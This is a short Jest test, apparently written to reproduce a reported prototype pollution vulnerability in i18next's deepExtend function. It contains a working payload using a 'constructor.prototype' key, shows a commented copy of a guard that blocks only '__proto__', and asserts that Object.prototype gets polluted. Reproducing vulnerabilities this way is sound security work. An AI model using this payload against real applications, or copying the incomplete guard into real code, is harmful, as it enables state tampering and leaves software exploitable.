//https://hackerone.com/reports/968355#:~:text=It%20allows%20to%20set%20many,example%2C%20you%20can%20call%20i18next.&text=To%20pollute%20Object%20you%20could,polluted%3A%20true%20%7D%20%7D%20%7D%20.

const i18next = require("i18next/dist/cjs/i18next");

// function deepExtend(target, source, overwrite) {
//   /* eslint no-restricted-syntax: 0 */
//   for (const prop in source) {
//     if (prop !== "__proto__") {
//       if (prop in target) {
//         // If we reached a leaf string in target or source then replace with source or skip depending on the 'overwrite' switch
//         if (
//           typeof target[prop] === "string" ||
//           target[prop] instanceof String ||
//           typeof source[prop] === "string" ||
//           source[prop] instanceof String
//         ) {
//           if (overwrite) target[prop] = source[prop];
//         } else {
//           deepExtend(target[prop], source[prop], overwrite);
//         }
//       } else {
//         target[prop] = source[prop];
//       }
//     }
//   }
//   return target;
// }

test("prototype pollution in i18next ", () => {
  const translations =
    '{ "constructor": { "prototype": { "polluted": "yes"} } }';
  const existingData = {};

  expect({}.polluted).toBe(undefined);

  i18next.deepExtend(existingData, JSON.parse(translations), true);

  expect({}.polluted).toBe("yes");
});
